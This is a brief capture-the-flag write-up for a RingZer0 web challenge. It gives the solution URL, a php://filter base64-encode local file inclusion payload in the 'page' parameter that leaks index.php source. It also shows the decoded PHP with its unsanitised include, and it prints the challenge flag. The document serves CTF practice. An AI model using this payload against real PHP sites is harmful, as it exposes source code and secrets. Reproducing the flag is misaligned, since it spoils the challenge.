<h1>Looking for password file</h1>
<h3>Description</h3>
<label>
http://challenges.ringzer0team.com:10075/?page=lorem.php
</label>
<h3>Solution</h3>
<label>http://challenges.ringzer0ctf.com:10076/?page=php://filter/convert.base64-encode/resource=index.php</label>

```console
echo "" | base64 -d
```
```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$include = isset($_GET['page']) ? $_GET['page'] : 'lorem.php';
// FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J
?>
...................................
```
<h3>Flag</h3>
<pre>
FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J
</pre>
